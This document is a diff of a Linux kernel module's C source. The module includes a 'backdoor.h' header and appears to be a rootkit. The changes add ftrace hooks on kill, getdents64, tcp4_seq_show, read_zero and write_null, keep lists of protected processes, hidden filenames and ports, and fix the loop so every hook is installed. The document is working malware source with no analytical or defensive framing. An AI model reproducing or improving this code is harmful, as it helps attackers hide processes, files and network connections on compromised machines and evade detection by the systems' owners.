@@ -1,41 +1,43 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/slab.h>
 
 #include "backdoor.h"
 #include "hook.h"
 #include "process.h"
 #include "data.h"
-#include <linux/slab.h>
+#include "file.h"
+#include "port.h"
+
 
 static struct ftrace_hook hooks[] =
         {
-                HOOK(HookKill, SYSCALL_NAME("kill"))
+                HOOK(HookKill, SYSCALL_NAME("kill")),
+                HOOK(HookReadZero, "read_zero"),
+                HOOK(HookWriteNull, "write_null"),
+                HOOK(HookGetdents64, SYSCALL_NAME("getdents64")),
+                HOOK(HookTcp4SeqShow, "tcp4_seq_show")
         };
 
 
 static struct proc_ops proc_fops = {
-        .proc_open = open_proc,
-        .proc_read = read_proc,
-        .proc_write = write_proc,
-        .proc_release = release_proc
+        .proc_open = test_open_proc,
+        .proc_read = test_read_proc,
+        .proc_write = test_write_proc,
+        .proc_release = test_release_proc
 };
 
 
 static int __init hello_init(void) {
     pr_info("hello!\n");
 
-    proc_create("test", 0666, NULL, &proc_fops);
+//    proc_create("test", 0666, NULL, &proc_fops);
 
     int i;
     for (i = 0; i < ARRAY_SIZE(hooks); ++i) {
-        FtraceHook(&(hooks[0].ops), hooks[0].hook_func_name);
+        FtraceHook(&(hooks[i].ops), hooks[i].hook_func_name);
     }
-
-    struct List *test;
-    test = (struct List *) kmalloc(sizeof(struct List), GFP_KERNEL);
-    test->data = "1471";
-    list_add_tail_rcu(&(test->list), &protect_process_list);
 
     return 0;
 }
@@ -43,21 +45,23 @@ static int __init hello_init(void) {
 static void __exit hello_exit(void) {
     pr_info("hello_exit!\n");
 
-    remove_proc_entry("test", NULL);
+//    remove_proc_entry("test", NULL);
 
-    struct List *test;
+    struct List *entry;
     struct list_head *curr, *next;
-    list_for_each_safe(curr, next, &protect_process_list) {
-        test = list_entry_rcu(curr, struct List, list);
-        if (!strcmp(test->data, "1471")) {
-            list_del_init(curr);
-            kfree(test);
+    struct list_head *(lists[]) = {&protect_process_list, &filename_list, &port_list};
+    int i;
+    for (i = 0; i < ARRAY_SIZE(lists); ++i) {
+        list_for_each_safe(curr, next, lists[i]) {
+            entry = list_entry_rcu(curr, struct List, list);
+            list_del_rcu(curr);
+            kfree(entry->data);
+            kfree(entry);
         }
     }
 
-    int i;
     for (i = 0; i < ARRAY_SIZE(hooks); ++i) {
-        FtraceUnHook(&(hooks[0].ops));
+        FtraceUnHook(&(hooks[i].ops));
     }
 }
 
